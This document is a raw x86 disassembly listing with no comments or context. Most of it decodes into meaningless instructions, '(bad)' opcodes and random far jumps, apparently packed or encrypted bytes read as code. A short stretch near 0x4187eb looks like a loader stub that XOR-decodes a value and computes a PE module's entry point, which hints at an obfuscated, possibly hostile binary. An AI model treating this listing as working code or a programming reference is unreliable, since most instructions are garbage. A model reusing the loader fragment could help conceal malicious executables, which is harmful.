  4187a4:	daa    
  4187a5:	and    BYTE PTR ds:0xd7b8b653,bh
  4187ab:	arpl   WORD PTR [edx+eax*4],cx
  4187ae:	push   esi
  4187af:	and    eax,0x9471b85
  4187b4:	and    BYTE PTR [esi+0x19],bh
  4187b7:	sbb    BYTE PTR [ebx-0x1becfe16],bh
  4187bd:	xor    al,0xe9
  4187bf:	mov    cl,0xfe
  4187c1:	repz bnd jl 0x4187de
  4187c5:	pop    ecx
  4187c6:	mov    WORD PTR [ebx-0x13],?
  4187c9:	ret    0x4775
  4187cc:	dec    esi
  4187cd:	add    BYTE PTR [eax-0x6d],0xe6
  4187d1:	sub    DWORD PTR [ebx+0x53062579],0x73a27fd3
  4187db:	ja     0x418837
  4187dd:	mov    ebx,0x1474d
  4187e2:	jg     0x4187ae
  4187e4:	or     DWORD PTR [bx],edx
  4187e7:	in     al,dx
  4187e8:	push   ebx
  4187e9:	cmp    esp,DWORD PTR [edi]
  4187eb:	add    ecx,0xffcd8d68
  4187f1:	mov    esi,ecx
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0x1ea1af2
  41883e:	fmulp  st(3),st
  418840:	pop    ss
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	jbe    0x41881c
  41884a:	push   esi
  41884b:	add    ch,BYTE PTR [ebx-0x62188b69]
  418851:	scas   eax,DWORD PTR es:[edi]
  418852:	retf   0xf9ed
  418855:	mov    ecx,0x744fe3c4
  41885a:	jb     0x41886c
  41885c:	add    eax,0x420eaae4
  418861:	jno    0x418809
  418863:	mov    bl,BYTE PTR [edi-0x6f1b9968]
  418869:	and    al,0x1a
  41886b:	cmp    al,0x8e
  41886d:	fwait
  41886e:	jecxz  0x4188eb
  418870:	ror    BYTE PTR [ebp+0xaeb8586],0x69
  418877:	sub    DWORD PTR ds:0x7adef1f,0x5e5e1c5
  418881:	pop    esi
  418882:	mov    eax,0x958cc4ec
  418887:	sbb    esp,ecx
  418889:	in     al,0xbc
  41888b:	and    esi,DWORD PTR [eax+0x6b1594e3]
  418891:	sbb    BYTE PTR [edi+0x1a07e96],bl
  418897:	out    dx,eax
  418898:	bound  ebx,QWORD PTR [edx+0x3bc90494]
  41889e:	pusha  
  41889f:	sbb    DWORD PTR ds:0x11696086,ebx
  4188a5:	sbb    dl,BYTE PTR ds:0x70947caa
  4188ab:	pop    ebx
  4188ac:	push   eax
  4188ad:	pop    esp
  4188ae:	call   0xe3fb:0xe790ac5
  4188b5:	sbb    BYTE PTR [ebp+0x5ed0dd26],dl
  4188bb:	add    bh,BYTE PTR [ebx+0x3f]
  4188be:	mov    bh,BYTE PTR [ecx-0x45]
  4188c1:	call   0xf0d7:0x4ce6b36e
  4188c8:	or     eax,0x9f8df0aa
  4188cd:	leave  
  4188ce:	mov    dh,0xa6
  4188d0:	aaa    
  4188d1:	mov    eax,ebp
  4188d3:	mov    cl,bh
  4188d5:	sub    ebx,edi
  4188d7:	bound  edi,QWORD PTR [esi]
  4188d9:	aaa    
  4188da:	or     cl,BYTE PTR [eax+0x66fcf1fa]
  4188e0:	push   es
  4188e1:	(bad)  [ebp+0x6c]
  4188e4:	and    eax,DWORD PTR [ebx]
  4188e6:	call   0x4215d8af
  4188eb:	mov    ah,0xd4
  4188ed:	bound  edx,QWORD PTR [esi+0x21ed0f36]
  4188f3:	out    0x94,eax
  4188f5:	jns    0x41889d
  4188f7:	scas   eax,DWORD PTR es:[edi]
  4188f8:	dec    esi
  4188f9:	shr    DWORD PTR [edx],0x80
  4188fc:	inc    ah
  4188fe:	push   esp
  4188ff:	dec    ebp
  418900:	clc    
  418901:	call   0xf146bb65
  418906:	push   ss
  418907:	jecxz  0x4188a6
  418909:	cmp    ch,BYTE PTR [eax+0x8]
  41890c:	mov    ds:0x87180b8b,al
  418911:	sbb    edi,DWORD PTR [ebx+0x65]
  418914:	leave  
  418915:	mov    ebx,0x9322f631
  41891a:	popa   
  41891b:	adc    ebx,ebx
  41891d:	outs   dx,DWORD PTR ds:[esi]
  41891e:	stc    
  41891f:	lock fisttp QWORD PTR [edi+ebp*4+0x245ba5f6]
  418927:	cs mov esp,0xb52016da
  41892d:	leave  
  41892e:	sub    BYTE PTR [esi-0x2cd29ef1],dl
  418934:	adc    edi,DWORD PTR [ebx+edi*4]
  418937:	shr    BYTE PTR [eax],1
  418939:	call   0x6e1f:0xc27ce889
  418940:	mov    ecx,0x8c96d5e1
  418945:	fadd   QWORD PTR ds:0x43aefa01
  41894b:	jecxz  0x4189a4
  41894d:	stos   DWORD PTR es:[edi],eax
  41894e:	iret   
  41894f:	dec    esi
  418950:	adc    edx,DWORD PTR [esp+ebx*8-0x5d]
  418954:	aas    
  418955:	in     al,0x27
  418957:	scas   al,BYTE PTR es:[edi]
  418958:	enter  0x18ad,0xfe
  41895c:	sbb    bl,dl
  41895e:	fwait
  41895f:	xlat   BYTE PTR ds:[ebx]
  418960:	jp     0x4189a5
  418962:	pop    edi
  418963:	and    eax,0x77f8a395
  418968:	cmp    al,0xd6
  41896a:	xor    esp,DWORD PTR [esi+eiz*1]
  41896d:	dec    eax
  41896e:	shl    ecx,1
  418970:	enter  0xc5d8,0xa9
  418974:	xchg   esp,eax
  418975:	push   0xfc31f7d1
  41897a:	rol    DWORD PTR [ecx],0x25
  41897d:	inc    edx
  41897e:	shl    DWORD PTR [ecx],0xbf
  418981:	pop    ecx
  418982:	and    BYTE PTR [ebp-0x71],bh
  418985:	cwde   
  418986:	ins    DWORD PTR es:[edi],dx
  418987:	or     BYTE PTR [ebp-0x39],0xac
  41898b:	rol    BYTE PTR [edi],cl
  41898d:	push   0xffffffd2
  41898f:	push   edi
  418990:	inc    ebx
  418991:	lea    edx,[esi+0x5b]
  418994:	push   cs
  418995:	loope  0x418943
  418997:	shr    DWORD PTR [ecx],0xdb
  41899a:	sub    BYTE PTR [edi-0x7333898a],bl
  4189a0:	fs cmc 
  4189a2:	push   ds
  4189a3:	and    BYTE PTR [esi],0x8f
  4189a6:	mov    ecx,0xb137c080
  4189ab:	lahf   
  4189ac:	mov    edx,0x2c53cadf
  4189b1:	ror    ch,0xc
  4189b4:	ror    esp,1
  4189b6:	dec    eax
  4189b7:	ins    BYTE PTR es:[edi],dx
  4189b8:	retf   0xbeb3
  4189bb:	lea    esp,[edi+0x12b52821]
  4189c1:	mov    ds:0xa17bd904,al
  4189c6:	aaa    
  4189c7:	test   al,0x6a
  4189c9:	test   eax,0x5f805957
  4189ce:	in     al,dx
  4189cf:	pop    ebp
  4189d0:	outs   dx,BYTE PTR ds:[esi]
  4189d1:	cmp    ebp,DWORD PTR [edi+ebp*2-0x80]
  4189d5:	xor    al,0xe
  4189d7:	shl    DWORD PTR [ecx],1
  4189d9:	mov    dh,0x15
  4189db:	call   0x2eb937d8
  4189e0:	lods   al,BYTE PTR ds:[esi]
  4189e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189e2:	div    ebp
  4189e4:	jb     0x418a47
  4189e6:	push   ebp
  4189e7:	lock or al,0x80
  4189ea:	fadd   st,st(1)
  4189ec:	push   ds
  4189ed:	daa    
  4189ee:	rol    cl,0xb2
  4189f1:	ror    DWORD PTR [edx+0x36],cl
  4189f4:	imul   ecx,ebx,0xffffffcf
  4189f7:	inc    DWORD PTR [edx]
  4189f9:	inc    edi
  4189fa:	and    BYTE PTR [edi+ebp*2+0x5],ah
  4189fe:	mov    edi,0x215f24bf
  418a03:	xlat   BYTE PTR ds:[ebx]
  418a04:	fadd   QWORD PTR ds:0xdcca7894
  418a0a:	jne    0x418a39
  418a0c:	xchg   ebp,eax
  418a0d:	scas   eax,DWORD PTR es:[edi]
  418a0e:	adc    al,0x20
  418a10:	mov    eax,ds:0x4356ee62
  418a15:	test   DWORD PTR [edx-0x1b],edi
  418a18:	(bad)  
  418a19:	sub    al,0xc4
  418a1b:	data16 (bad) 
  418a1d:	out    0xa8,eax
  418a1f:	ins    BYTE PTR es:[edi],dx
  418a20:	lock dec ecx
  418a22:	inc    ebx
  418a23:	add    esp,DWORD PTR [ecx]
  418a25:	jge    0x418a19
  418a27:	jge    0x418a59
  418a29:	mov    ebp,0xfc3e5154
  418a2e:	inc    eax
  418a2f:	lock loop 0x418a40
  418a32:	js     0x418a4a
  418a34:	into   
  418a35:	ins    BYTE PTR es:[edi],dx
  418a36:	jmp    FWORD PTR [eax-0x1db00584]
  418a3c:	addr16 and al,0x1
  418a3f:	repnz leave 
  418a41:	inc    ebp
  418a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a43:	sub    ebp,eax
  418a45:	lods   eax,DWORD PTR ds:[esi]
  418a46:	xlat   BYTE PTR ds:[ebx]
  418a47:	adc    al,0x11
  418a49:	shl    BYTE PTR [ecx],0x75
  418a4c:	sahf   
  418a4d:	push   es
  418a4e:	mov    cl,0x75
  418a50:	leave  
  418a51:	jmp    0x6751959b
  418a56:	das    
  418a57:	scas   al,BYTE PTR es:[edi]
  418a58:	(bad)  
  418a5a:	cmp    bh,BYTE PTR ss:[ebp-0x7bfbe63b]
  418a61:	jp     0x418adb
  418a63:	cmp    esi,DWORD PTR [edx+0x66]
  418a66:	push   esi
  418a67:	xlat   BYTE PTR ds:[ebx]
  418a68:	mov    edx,ebx
  418a6a:	ins    BYTE PTR es:[edi],dx
  418a6b:	ins    DWORD PTR es:[edi],dx
  418a6c:	(bad)  
  418a6d:	std    
  418a6e:	adc    DWORD PTR [ecx-0x240407aa],eax
  418a74:	mov    al,ds:0x39989ea6
  418a79:	nop
  418a7a:	ret    
  418a7b:	xchg   edx,eax
  418a7c:	ror    DWORD PTR [edx-0xa76770b],1
  418a82:	inc    edx
  418a83:	push   edx
  418a84:	jmp    0x418a23
  418a86:	int    0x17
  418a88:	sbb    DWORD PTR [edi],esi
  418a8a:	hlt    
  418a8b:	adc    al,0x97
  418a8d:	outs   dx,BYTE PTR ds:[esi]
  418a8e:	aas    
  418a8f:	inc    ebp
  418a90:	cmp    dl,BYTE PTR [esi]
  418a92:	call   0xa9d3:0xae83e406
  418a99:	add    DWORD PTR [ecx+0x282c5929],ebp
  418a9f:	adc    BYTE PTR cs:[ebx-0x164dd10c],dh
  418aa6:	pop    edx
  418aa7:	add    cl,al
  418aa9:	adc    esp,edx
  418aab:	jecxz  0x418afb
  418aad:	add    BYTE PTR [edx-0x1f],bh
  418ab0:	add    eax,DWORD PTR [eax+esi*4+0x2c373b77]
  418ab7:	jg     0x418ac0
  418ab9:	(bad)
  418abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418abf:	inc    edx
  418ac0:	pop    edx
  418ac1:	adc    al,0xb9
  418ac3:	pop    ebx
  418ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ac5:	leave  
  418ac6:	sub    esp,DWORD PTR [edi-0x4]
  418ac9:	mov    ch,dl
  418acb:	cs pusha 
  418acd:	xchg   esi,eax
  418ace:	pop    esp
  418acf:	pop    ss
  418ad0:	repnz mov eax,ds:0xd7e143f9
  418ad6:	pushf  
  418ad7:	adc    al,0xdf
  418ad9:	jl     0x418aa2
  418adb:	aaa    
  418adc:	test   BYTE PTR [ebp+ebx*1+0x52eb490a],bl
  418ae3:	lods   al,BYTE PTR ds:[esi]
  418ae4:	out    0xc9,al
  418ae6:	into   
  418ae7:	mov    ecx,0xc93f2b1
  418aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aed:	mov    eax,ds:0x5beb2188
  418af2:	push   ebp
  418af3:	inc    edx
  418af4:	dec    esi
  418af5:	add    cl,ah
  418af7:	outs   dx,DWORD PTR ds:[esi]
  418af8:	xchg   esi,eax
  418af9:	dec    edx
  418afa:	ja     0x418afe
  418afc:	neg    edx
  418afe:	test   ebp,ebp
  418b00:	push   ss
  418b01:	xchg   BYTE PTR [ebx+0x12e64d99],ch
  418b07:	call   0xe762ed7a
  418b0c:	sbb    ebp,edi
  418b0e:	jle    0x418aca
  418b10:	add    BYTE PTR [esi+0x56c0683e],dh
  418b16:	sahf   
  418b17:	imul   ebp,esp,0xd354fafe
  418b1d:	call   0x789:0x109f281e
  418b24:	adc    BYTE PTR [edx+ebp*4+0x3e],bl
  418b28:	in     al,dx
  418b29:	cdq    
  418b2a:	hlt    
  418b2b:	dec    edi
  418b2c:	cld    
  418b2d:	adc    eax,0x52a93acd
  418b32:	ja     0x418b22
  418b34:	cmp    cl,BYTE PTR [edx-0x45e2f55b]
  418b3a:	xor    edi,DWORD PTR [ecx-0x53]
  418b3d:	and    ebx,DWORD PTR [edi+0x53f58854]
  418b43:	mov    WORD PTR [edx-0x1695ca01],cs
  418b49:	inc    ecx
  418b4a:	add    BYTE PTR [ebx+0x19482],cl
  418b50:	add    cl,ch
  418b52:	adc    eax,0xcb000003
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	pop    edi
  418b63:	xchg   esi,eax
  418b64:	ror    cl,1
  418b66:	adc    al,bl
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	dec    ecx
  418b6f:	mov    bl,BYTE PTR [ecx+0x5c]
  418b72:	loope  0x418bb4
  418b74:	out    dx,al
  418b75:	arpl   WORD PTR [ecx],cx
  418b77:	sbb    ebp,DWORD PTR [esi+0x3f]
  418b7a:	push   esi
  418b7b:	imul   DWORD PTR ss:[edx+0x6d]
  418b7f:	das    
  418b80:	pop    ecx
  418b81:	sar    DWORD PTR [esp+ebp*1+0x606740b3],0x5f
  418b89:	bound  edx,QWORD PTR [edi]
  418b8b:	clc    
  418b8c:	or     ebp,DWORD PTR [edi-0x49]
  418b8f:	clc    
  418b90:	jecxz  0x418bd9
  418b92:	not    DWORD PTR fs:[ebx+0x64043be]
  418b99:	mov    dh,0x69
  418b9b:	out    0xc5,al
  418b9d:	adc    ebp,ebp
  418b9f:	mov    ch,0xf0
  418ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ba2:	adc    al,0x28
  418ba4:	push   ecx
  418ba5:	or     eax,0x1335982d
  418baa:	jno    0x418b8e
  418bac:	cmp    bl,BYTE PTR [esi]
  418bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418baf:	jmp    0x9228:0x417f4bd2
  418bb6:	ret    0xdb2d
  418bb9:	mov    dl,BYTE PTR [ebp+0x13]
  418bbc:	push   ebp
  418bbe:	mov    ds:0x54996e02,eax
  418bc3:	mov    ds:0x24e5d906,eax
  418bc8:	mov    ecx,0x15baf0b8
  418bcd:	xchg   ecx,eax
  418bce:	pop    ebx
  418bcf:	imul   eax,edi,0xffffffeb
  418bd2:	outs   dx,DWORD PTR ds:[esi]
  418bd3:	xchg   edi,eax
  418bd4:	or     eax,0x85b1bd58
  418bd9:	or     edi,ebx
  418bdb:	push   ebx
  418bdc:	fstp   QWORD PTR [ebp+0x711fffa1]
  418be2:	jb     0x418bd6
  418be4:	sbb    ch,ah
  418be6:	mov    ds:0x7ba8a51a,al
  418beb:	sbb    DWORD PTR [edx+0x6639bc9a],ebp
  418bf1:	rcl    BYTE PTR [eax-0x5c7dab82],1
  418bf7:	fsubr  st(0),st
  418bf9:	adc    bl,BYTE PTR [eax+0x3]
  418bfc:	arpl   WORD PTR [edi-0x3c],ax
  418bff:	or     BYTE PTR [edx+ebp*8],bl
  418c02:	inc    ebx
  418c03:	pop    edi
  418c04:	lds    esp,FWORD PTR [ebp-0x3]
  418c07:	and    BYTE PTR [edi],bl
  418c09:	cs xor al,0xf9
  418c0c:	xor    ebp,DWORD PTR [eax]
  418c0e:	cmp    DWORD PTR [ebp+0x2f],ecx
  418c11:	fild   QWORD PTR [edx]
  418c13:	dec    edi
  418c14:	inc    esi
  418c15:	pop    ecx
  418c16:	retf   
  418c17:	dec    ecx
  418c18:	jmp    0x7b16:0x50dab7f6
  418c1f:	inc    esi
  418c20:	mov    bl,0xe
  418c22:	lock xchg BYTE PTR [ecx-0x39a630d6],dh
  418c29:	jbe    0x418c84
  418c2b:	ja     0x418c7d
  418c2d:	xor    al,0x92
  418c2f:	test   al,0xf9
  418c31:	adc    DWORD PTR [eax],edx
  418c33:	out    dx,eax
  418c34:	cmc    
  418c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c36:	cdq    
  418c37:	fld    TBYTE PTR [ebx+0x4b]
  418c3a:	in     al,0x6a
  418c3c:	lea    edi,[eax+0x242e8b42]
  418c42:	add    cl,BYTE PTR [ebx+edi*8]
  418c45:	and    DWORD PTR [eax+ecx*4-0xc71f36],ecx
  418c4c:	mov    WORD PTR ds:0x7c47e6cf,es
  418c52:	sub    eax,DWORD PTR [di]
  418c55:	pop    esi
  418c56:	enter  0xf841,0xd3
  418c5a:	aas    
  418c5b:	nop
  418c5c:	ds (bad) 
  418c5e:	lock adc DWORD PTR [ecx-0x864e13a],ecx
  418c65:	add    al,0x85
  418c67:	js     0x418c02
  418c69:	push   esi
  418c6a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  418c6c:	shl    DWORD PTR [ebp-0x4acf8cae],cl
  418c72:	dec    edx
  418c73:	int    0x8b
  418c75:	xor    DWORD PTR [eax-0x3],edx
  418c78:	xor    DWORD PTR [ebp-0x5125ec58],esi
  418c7e:	ja     0x418c38
  418c80:	enter  0x7c1b,0x84
  418c84:	xor    DWORD PTR [ebx+0x6c080f1c],eax
  418c8a:	arpl   WORD PTR [edi-0x43e3d97b],bx
  418c90:	(bad)  
  418c91:	in     al,dx
  418c92:	ror    DWORD PTR [edi],0xd8
  418c95:	and    dh,BYTE PTR [eax]
  418c97:	pop    esp
  418c98:	sbb    al,0xda
  418c9a:	cmc    
  418c9b:	(bad)  
  418c9d:	or     dl,ah
  418c9f:	lds    ebx,FWORD PTR [esi-0x619f5490]
  418ca5:	jo     0x418cf4
  418ca7:	xchg   edi,eax
  418ca8:	add    dl,BYTE PTR [ebx+ecx*1]
  418cab:	outs   dx,DWORD PTR ds:[esi]
  418cac:	and    al,0xc
  418cae:	jns    0x418d2c
  418cb0:	xor    cl,bl
  418cb2:	dec    eax
  418cb3:	mov    al,ds:0x2dc5f5d5
  418cb8:	push   edi
  418cb9:	xchg   edx,eax
  418cba:	mov    dh,0xff
  418cbc:	cld    
  418cbd:	xor    al,0x54
  418cbf:	call   FWORD PTR [ebx]
  418cc1:	add    DWORD PTR [eax],edi
  418cc3:	jp     0x418d3f
  418cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cc6:	inc    ebp
  418cc7:	jbe    0x418d28
  418cc9:	sub    DWORD PTR [ebp-0x6e],0xffffffcc
  418ccd:	or     eax,0x3f2b2b33
  418cd2:	sbb    eax,0x50ed3925
  418cd7:	jno    0x418d4c
  418cd9:	ins    DWORD PTR es:[edi],dx
  418cda:	mov    bh,0x41
  418cdc:	pusha  
  418cdd:	pop    es
  418cde:	(bad)  [ecx-0x3a]
  418ce1:	fmul   QWORD PTR ds:0xa4ad2ca1
  418ce7:	mov    edi,0x55abc3f9
  418cec:	lods   al,BYTE PTR ds:[esi]
  418ced:	std    
  418cee:	mov    cl,0xc9
  418cf0:	push   esi
  418cf1:	imul   ecx,ebp,0x20
  418cf4:	(bad)  
  418cf5:	jmp    0xc250:0x456264ca
  418cfc:	mov    ah,0xac
  418cfe:	mov    BYTE PTR [edx],dh
  418d00:	and    DWORD PTR [edi+0x27e5c263],ecx
  418d06:	scas   al,BYTE PTR es:[edi]
  418d07:	pop    esi
  418d08:	mov    esp,0xe182515e
  418d0d:	inc    ebx
  418d0e:	test   BYTE PTR ss:[esi-0x2cfe31f0],bl
  418d15:	add    bh,ah
  418d17:	int    0x3d
  418d19:	xlat   BYTE PTR ds:[ebx]
  418d1a:	clc    
  418d1b:	sbb    DWORD PTR [edi+eiz*8+0x4d],0x9ee68993
  418d23:	in     al,0xe0
  418d25:	test   eax,0x99a6daa6
  418d2a:	(bad)  
  418d2b:	sub    dl,BYTE PTR [edx+0x60]
  418d2e:	inc    eax
  418d2f:	es ins DWORD PTR es:[edi],dx
  418d31:	cmp    al,0x71
  418d33:	outs   dx,BYTE PTR ds:[esi]
  418d34:	ds push es
  418d36:	sti    
  418d37:	push   0x188b961b
  418d3c:	dec    esi
  418d3d:	scas   eax,DWORD PTR es:[edi]
  418d3e:	dec    ecx
  418d3f:	repnz cwde 
  418d41:	push   ecx
  418d42:	mov    ebp,0x96e30a76
  418d47:	pop    edi
  418d48:	jne    0x418db3
  418d4a:	or     ebp,esi
  418d4c:	mov    bh,0x32
  418d4e:	pop    ebp
  418d4f:	dec    edi
  418d50:	and    dh,bl
  418d52:	adc    al,0x10
  418d54:	mov    ?,WORD PTR [edx]
  418d56:	xor    al,0x9d
  418d58:	std    
  418d59:	cmp    eax,0xae1453c9
  418d5e:	stc    
  418d5f:	ja     0x418d1b
  418d61:	das    
  418d62:	es jae 0x418ce7
  418d65:	or     eax,eax
  418d67:	fwait
  418d68:	ins    BYTE PTR es:[edi],dx
  418d69:	stos   DWORD PTR es:[edi],eax
  418d6a:	xor    ah,BYTE PTR [edx+eax*4+0x6802a9c6]
  418d71:	sbb    al,0x33
  418d73:	shr    DWORD PTR [ecx+0x6050f0f7],0xe5
  418d7a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  418d7c:	nop
  418d7d:	loope  0x418db1
  418d7f:	shl    BYTE PTR [ebx+0x5b],0x4a
  418d83:	out    0xa2,eax
  418d85:	sub    BYTE PTR [edx+edx*8],cl
  418d88:	icebp  
  418d89:	retf   
  418d8a:	repnz stc 
  418d8c:	mov    dl,0xdd
  418d8e:	pop    esi
  418d8f:	sbb    eax,ebx
  418d91:	pop    eax
  418d92:	xchg   ecx,eax
  418d93:	aam    0x25
  418d95:	or     bl,al
  418d97:	gs inc ecx
  418d99:	jae    0x418dee
  418d9b:	std    
  418d9c:	sbb    al,0x75
  418d9e:	jmp    0x418d35
  418da0:	in     eax,0x23
  418da2:	and    BYTE PTR [esi+0x47f1a3],0x4b
  418da9:	jg     0x418dc8
  418dab:	sbb    DWORD PTR [edi],esp
  418dad:	or     bl,0x16
  418db0:	fist   WORD PTR [si]
  418db3:	int    0x9a
  418db5:	and    BYTE PTR [eax-0x552946a],dl
  418dbb:	call   0x20e9:0x9e52d337
  418dc2:	imul   ecx,DWORD PTR [edi+0x49],0x43
  418dc6:	xchg   esi,eax
  418dc7:	out    0xf7,al
  418dc9:	cdq    
  418dca:	sahf   
  418dcb:	gs lahf 
  418dcd:	adc    DWORD PTR [eax+edi*8],edx
  418dd0:	jns    0x418d56
  418dd2:	sub    dh,BYTE PTR [esi+0x9]
  418dd5:	jmp    0xa0b1:0x5c1dab25
  418ddc:	mov    bh,0xa4
  418dde:	lahf   
  418ddf:	xor    eax,0x486aef9d
  418de4:	dec    eax
  418de5:	idiv   esp
  418de7:	pusha  
  418de8:	mov    BYTE PTR [edi+0x24c5bceb],bh
  418dee:	in     al,dx
  418def:	push   ebx
  418df0:	cdq    
  418df1:	adc    ah,BYTE PTR [ebx]
  418df3:	inc    ecx
  418df4:	sahf   
  418df5:	retf   0x2d24
  418df8:	cwde   
  418df9:	push   eax
  418dfb:	mov    ds:0xe70ce5d9,eax
  418e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e01:	dec    edi
  418e02:	int    0x54
  418e04:	xchg   edx,eax
  418e05:	cmc    
  418e06:	push   edi
  418e07:	cmovns edx,DWORD PTR [ebx]
  418e0a:	test   al,0x98
  418e0c:	out    dx,eax
  418e0d:	and    al,0x7
  418e0f:	inc    edi
  418e10:	or     al,0x12
  418e12:	(bad)  
  418e13:	enter  0xcbbe,0xc8
  418e17:	leave  
  418e18:	mov    ecx,0xb7b7c983
  418e1d:	hlt    
  418e1e:	xchg   edx,eax
  418e1f:	xchg   edi,eax
  418e20:	popa   
  418e21:	xchg   edi,eax
  418e22:	lods   eax,DWORD PTR ds:[esi]
  418e23:	scas   eax,DWORD PTR es:[edi]
  418e24:	hlt    
  418e25:	jnp    0x418e7b
  418e27:	push   0x6f
  418e29:	(bad)
  418e2c:	dec    edx
  418e2d:	and    DWORD PTR [esp+ebp*2+0x5ae97fed],esp
  418e34:	or     DWORD PTR [edx],0xffffff9a
  418e37:	cmc    
  418e38:	in     eax,0xda
  418e3a:	xor    DWORD PTR [edi+0x5775bf03],ecx
  418e40:	mov    WORD PTR [esi],cs
  418e42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e43:	pusha  
  418e44:	das    
  418e45:	ror    BYTE PTR [ebx+0x72230ff4],1
  418e4b:	sub    ch,BYTE PTR [ecx]
  418e4d:	jle    0x200be6a1
  418e53:	inc    edi
  418e54:	cmp    al,0x3b
  418e56:	xchg   ebp,eax
  418e57:	enter  0x2d37,0x6b
  418e5b:	add    ebp,eax
  418e5d:	inc    ebp
  418e5e:	(bad)  ds:0xdc37fe03
  418e64:	push   0xe8e16d37
  418e69:	fnstenv [esi-0x1]
  418e6c:	xor    BYTE PTR [ebx+0x15e91045],cl
  418e72:	add    eax,DWORD PTR [eax]
  418e74:	add    bl,cl
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	test   BYTE PTR [esi-0x3ff2311b],0x7f
  418e88:	js     0x418f05
  418e8a:	jle    0x418f04
  418e8c:	js     0x418f09
  418e8e:	pusha  
  418e8f:	pop    ds
  418e90:	sbb    BYTE PTR ds:[ebx-0x21],al
  418e94:	pop    edi
  418e95:	mov    ch,BYTE PTR [edi]
  418e97:	or     dh,bh
  418e99:	fcom   DWORD PTR [ecx+esi*2]
  418e9c:	pop    ecx
  418e9d:	fsub   DWORD PTR [ebx]
  418e9f:	inc    ecx
  418ea0:	(bad)  
  418ea1:	stos   BYTE PTR es:[edi],al
  418ea2:	(bad)  
  418ea3:	aam    0x0
  418ea5:	xor    BYTE PTR [eax+0x6fca43d3],bl
  418eab:	in     eax,0x8c
  418ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418eae:	cmp    dl,BYTE PTR [ebx]
  418eb0:	mov    ebx,0x197155cd
  418eb5:	xchg   edx,ebp
  418eb7:	mov    ecx,0xa0ee48b1
  418ebc:	pop    eax
  418ebd:	mov    bl,0xa8
  418ebf:	outs   dx,DWORD PTR ds:[esi]
  418ec0:	xchg   edx,eax
  418ec1:	pop    esp
  418ec2:	aad    0xf5
  418ec4:	icebp  
  418ec5:	jbe    0x418f39
  418ec7:	sub    BYTE PTR [ecx+0x3854cf74],dl
  418ecd:	xchg   BYTE PTR [esi],dl
  418ecf:	dec    ecx
  418ed0:	xchg   ecx,eax
  418ed1:	mov    eax,0x1b372b8b
  418ed6:	imul   esi,DWORD PTR [ecx+0x7d],0x4e4a2b3d
  418edd:	out    dx,eax
  418ede:	jns    0x418f21
  418ee0:	fild   DWORD PTR [edx+0x58]
  418ee3:	push   ebp
  418ee4:	into   
  418ee5:	push   cs
  418ee6:	inc    ebp
  418ee7:	cmp    BYTE PTR [ecx],0x6e
  418eea:	push   ebx
  418eeb:	or     BYTE PTR [edx],ah
  418eed:	data16 or al,0xb5
  418ef0:	test   DWORD PTR [ecx-0x4f],eax
  418ef3:	mov    ecx,0x7f5d1d5c
  418ef8:	stc    
  418ef9:	jnp    0x418ef3
  418efb:	jmp    0xc057702a
  418f00:	fs sahf 
  418f02:	dec    ecx
  418f03:	xor    BYTE PTR [esp+edx*2+0x1],dl
  418f07:	mov    bh,0x33
  418f09:	add    bh,BYTE PTR [eax]
  418f0b:	lea    eax,[ebx-0x337c9b23]
  418f11:	xchg   edi,eax
  418f12:	hlt    
  418f13:	scas   eax,DWORD PTR es:[edi]
  418f14:	in     eax,dx
  418f15:	call   0x5d1d:0x4eaa3f80
  418f1c:	cwde   
  418f1d:	fs inc esi
  418f1f:	in     eax,0xb2
  418f21:	and    eax,0x51c9b71f
  418f26:	push   DWORD PTR [ecx-0x4ab08fa4]
  418f2c:	mov    dl,BYTE PTR [ebx]
  418f2e:	mov    BYTE PTR [eax-0x6ecfd6a9],dh
  418f34:	es pop esp
  418f36:	ror    DWORD PTR [ebp-0x4f],0x4b
  418f3a:	aad    0x1e
  418f3c:	lahf   
  418f3d:	adc    al,0x93
  418f3f:	push   esi
  418f40:	mov    ebx,0xcf738d57
  418f45:	test   BYTE PTR [esi-0x7e3935b1],dl
  418f4b:	adc    esi,DWORD PTR [esi+0x49]
  418f4e:	shl    DWORD PTR [ebx+0x7c],cl
  418f51:	push   0x937f83bd
  418f56:	push   0xffffffbd
